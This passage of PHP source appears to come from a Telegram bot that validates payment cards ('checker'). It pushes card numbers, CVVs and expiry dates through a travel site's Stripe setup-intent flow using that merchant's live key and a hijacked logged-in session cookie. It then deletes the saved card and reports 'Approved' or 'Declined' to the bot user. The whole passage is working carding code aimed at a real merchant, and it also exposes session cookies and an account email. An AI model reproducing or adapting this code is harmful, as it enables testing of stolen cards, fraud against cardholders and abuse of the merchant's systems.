    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
// Extraer nonce
$patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
preg_match($patron_nonce, $response, $matches_nonce);
$nonce = $matches_nonce[1];
curl_close($curl);
echo "$nonce\n";



///EXTRAE EL ID////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Ff998a153d0%3B+stripe-js-v3%2Ff998a153d0%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.thetravelinstitute.com&time_on_page=33566&client_attribution_metadata%5Bclient_session_id%5D=c9054b3a-2bfb-44df-8260-a7c7b5de1e1f&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=fa5d9d41-7dd0-489e-8250-c0f3517b2a9164221b&muid=2e26787c-c102-4578-aa4b-fba54c859921bb7405&sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoid1dMTmVKWTMrZlpTQi9MRlBocjI4cmxUTWd3N2Y3TVlRQ3g0dUM0T2Ezam0xeE1wQmxrczBaYTlqYitkUWhaVGpEQVlPYzJIMjdRNjMrWFZKN01YaTE2VFJFOUl5K2s0dEk5d2dKSHpyNTBzSittU2JHZVJlWGdwMHoydFVVd3U5R1loellscGU0N01BZnlXdXpZNlFvMEZVS3ZQd2xiV1JMVmFldjFwNEk2VFdUL1IxeFdpd3AxL052cks3dzZiMTB0eGNzR2w0d2ZEbHdNWTNyR0o0Z3paK0s0aGt1bzVxYkcwb2lpdHhtazRMQlZGQ2ROeElXMGtDQXltazM3cldrNXc3dVY4SE1sZ2tWZ0VCOUt4YTNqSE1mcThkczk1OWZSVlVoVkRmL3U1cWk0a1h2alkxZGhVQk1FQWFmRi9kd3I1Vjdsd0tjcmtNb25ueHFLTHBZRHVmdEV1L1lpeCtMVzYxOS9LOGdtVjJIVERWRFZ2d0JKMG9JclpOeEFYdEsxanhrMmMvc3FlZ2E3Q3VTVGdud3lYNFI0Nk1laGduU3dWNndscU56dDcyaGJ2V25OTGRmMmNGUVBSKzJHSEhHLy9tWFl0V0ZzV3JOM2lRa04xVmFtU1RLYkJZSEVGd2RCUGlTVjFtZndhZnFsY1VsZW5FcHJaNFM1ckFZY3g0THgxaFB0ZHYxNEdFN2VDZ2w1RmJiMEtkS2ZDQzA4L1ZyOTFpcDlTN2hJQVlFS2NBNGtLbVNoaE1lbWtsNDFJTmpFc3lLdDJKeUx6RUhqeXFqTWppTVpWOUlMS2FnZ2ZBOWRFalI4empOelk1RXBnNmNuRmdjUHJMQjBYbEl1aWNUNStQU2FMVmM2d2R4L3ArOW1iMFVMMXduQWJkbE0wVDlLMjd3eFRmaXVCZVA3RVhQQlMxaDA4aVpmK1o0UDcyRmJXZVdIbmx0bWZ5dUxFRnJQTTduZEsvOHlnalV3S25PeTF6aXBQSktkZnJNNmtZWFhMNUVRVFowY2NXNnlIUTdzWC8yQTNIdVBWcWhUVmt2NjhjTnppQzlnaFNIODlFNGVUbkFnYzdrYnQySHhVQ3ZEeDZvNGNiTFRuaHNYK05iR2E4MVg5clRXU2xxZkQ4emFWU2YwRG1CaExCa3A2TEZjZVFmNERKWWpJdFREVm8zQVlkdFZXYWV0bjBvVTU1ZkxySTZFZWF1RURhaEk3b0J3SUVYWlhEYWN5L1o5UGhnVlJaUk5SMDBuU0NHd2dKY0s2akJ4QW0xNGREOHlmZXF4eWxiREd2V2RNbTdQdmp6Vnp3b05HbnRWS2hHSXlkOFVlN3ppV05LS0ZlRkdpWVdGWnMzV255OHUzbHVpT243VjlYU2tRekdlQjk2Z2NzY1QyU21hQlNJQkNZNnVWOUw0eEVGOXBRY2hCRFM2ZVdKelZMd1ZVREFBbTdMMytMdEhCZVpRbXlDRFhHaVdxSC9xQkl4SHpxamZXdFovZUZqNU9SMThFTi85bS8wSTl5clRJd1RSM1VoeUxYR0g5T0Nla2hYOXM4T3VqMXJaYjlobVNJR2lrVWh5MUxSd24ySFUwbTNGWGhYYUdqSnBvdEQ2aXhHVWhMRzRmck1pcktWL1BjSHpnaENLQkhnYTkvVUR3Y05uTzJ0QTdzTkZMYkNBTDZwS2RuZVlqQUFJS2Y0Y3MvRlBZR2NFUWp4RisvME5NdkN4L0NpUW1UWWVMTTJHT1lGUlZwZjFlS0xscUJEZzZ4N3grMTQxZzZ6UW5mdE1nUXM2aTV0SzRuejdJbndoU2Y1cTRwQy8rUjRKcDJrRUZ3N0tvai9WODBicE54SmwrbjZhU0NFdmpKMys1d2p3Y3VDZXdVeFh5V3F6bDQ5ZXpWRnpuclJENUErVUo4Uk5xUEMxT29Zelo2YWRMWjhnalRMWE9BRmJ0UVZlc3VHZm8wOUZUTzliSStkVUpHNndtTURIdHdld2hUbjNQc0VkQVBRUG5qU3hqWE40TlVJcDQzWm9CVnFXU2toSjl3VXRjWVlDVmd4UFJBZjV2Vzd4bTBHckl2VS9RYmhCSzRma0tORjhlWDlINnMrUE9HcTVwcExZU0VxMjNRemRXVTRaK3E2WUlzbGg2VWc2NmJLN0c4VE5hVkpnZDBMZGdzY3dBSWo4S21qdElxaEhoVTI4eTlCaFhYMzhhRW9RMk1uZFdOR3ZBRzhIb3RabFVjK2hPQ3I0WHZCbzFwMlNma1ZjbGM1Um1zY2tMSURMYUpFMGxZYTE3VEJUZzVMY2pZUVRhQ2YzMXp5ZWtML05aSUZTMTJLUjF2YmE4a3lOL2xiUlJ5VG9RdUNhLzBxYnJlbEFITDg1M1p2TkZVTFQ5ZWZQdkR6KzFjR21wVUd5Z3QzNjBwa3k2azNuWEtDb2FXYmlsS1hoRHIwRWV6ZDNTK2I2bjV4VVBLcS9nZCt4ZW1nazQwNTUwS3QrcVNKd0Q5Y1pMWXZDemlOZm94YS9IcEtrZkZ6Z2o0UFZ3WTlUMmIyNlFtaTIySWVDbjRXcmltMnFGSHA3U25tczlVYVBOZTBtckFNMXZZeXBZRVY0eTY1b3lyMHV1S0NhOFRMNDFZdHZsSndlUmx3aVY1ZEROYkhGOTJUSUt6Q1Fycko2U2Q3Q1lsRVdLZWc4YkdrT0lwSFJEUmg4RFB3emQ4NForSWo5TW9nd1JqTmtsYzFmd05NMFJHaTVKR2RlenRRPT0iLCJleHAiOjE3MzYzMDMyMjcsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMzhhZmU0NTYiLCJwZCI6MCwiY2RhdGEiOiJGdjl4TDd0dnd4ck8wc0NYaTNTYkNNRE92aFlnSU1kVGVtQnp4N1I2MWlYYzdORG15TVFCTFVnY2d1THlpTEYxbUIyVVRsVTQyOTBsQjN5eXFRa3hSbkZINzdaaXAvaitTVVVpNkY3SERIcWpzOVFZbzlvTTVyTXFFRHFneXA2NmRtcjBtZ0xjeFkwOE9RbWY1ZFVVM0J3bmh2bWpRemtEWXRJenVMb3pWV2VudGtLcGxlTVErbGZtbCs3U2F0ZmVRQytkUkNWeU4vQXBQVE5wIn0.DGsmA4QzCei_0e4Y2dNPChVr6kdtI2v11J6RtEMpkFo',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'origin: https://www.thetravelinstitute.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "Approved! ✅";

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.thetravelinstitute.com/my-account/payment-methods/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);



} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";




if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}

  
	 return null; // Si el mensaje no es un comando válido, devuelve null
}
?>
